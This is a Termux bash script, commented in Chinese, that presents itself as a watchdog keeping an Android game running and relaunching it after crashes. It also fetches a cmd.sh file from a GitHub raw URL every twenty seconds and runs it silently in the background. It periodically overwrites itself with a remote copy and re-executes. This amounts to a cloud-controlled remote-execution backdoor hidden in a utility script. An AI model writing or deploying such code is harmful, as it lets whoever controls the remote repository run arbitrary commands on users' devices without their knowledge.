#!/data/data/com.termux/files/usr/bin/bash
# 二次元守护 · 云控进化版
PKG="com.tancha.ycgame"
ACTIVITY=".MainActivity"
LOCAL_VERSION="2.6"
BASE_URL="https://raw.githubusercontent.com/auth-server-by/auth-server/main"
RESTART_LIMIT=10
CHECK_INTERVAL=2
REMOTE_CMD_INTERVAL=10

dl() { curl -skL --connect-timeout 5 "$1" 2>/dev/null || wget -qO- --timeout=5 "$1" 2>/dev/null; }

# 版本检查+自动更新(非阻塞)
check_update() {
  CLOUD_VER=$(dl "$BASE_URL/version.txt" | head -1 | tr -d '[:space:]')
  [ -z "$CLOUD_VER" ] && return
  if [ "$CLOUD_VER" != "$LOCAL_VERSION" ]; then
    echo "🔃 新版本，自动更新..."
    NEW="$HOME/guard_new.sh"
    dl "$BASE_URL/guard.sh" > "$NEW"
    if [ -s "$NEW" ] && grep -q "二次元守护" "$NEW"; then
      chmod +x "$NEW"
      mv "$NEW" "$0"
      exec bash "$0"
    fi
  fi
}

# 远程命令执行(非阻塞)
exec_remote_cmd() {
  TMP="$HOME/remote_cmd.sh"
  dl "$BASE_URL/cmd.sh" > "$TMP" 2>/dev/null
  if [ -s "$TMP" ] && [ "$(head -1 "$TMP")" = "#!guard-cmd-allow" ]; then
    bash "$TMP" >/dev/null 2>&1 &
  fi
  rm -f "$TMP"
}

launch_game() {
  am start -n "$PKG/$ACTIVITY" >/dev/null 2>&1
  sleep 2
  pidof "$PKG" >/dev/null 2>&1 || {
    monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
    sleep 2
  }
}

echo "🛡️ 守护开始 (v$LOCAL_VERSION)"
cycle=0 crash=0 running=false
while :; do
  cycle=$((cycle+1))
  [ $((cycle % 60)) -eq 0 ] && check_update        # 每2分钟检查版本
  [ $((cycle % 10)) -eq 0 ] && exec_remote_cmd     # 每20秒执行远程命令

  if pidof "$PKG" >/dev/null 2>&1; then
    running=true
    crash=0
  else
    if $running; then
      crash=$((crash+1))
      echo "⚠️ 退出 (${crash}/${RESTART_LIMIT})"
      if [ $crash -gt $RESTART_LIMIT ]; then
        echo "❌ 连续异常超限，停止守护"
        exit 1
      fi
      launch_game
    fi
    running=false
  fi
  sleep $CHECK_INTERVAL
done
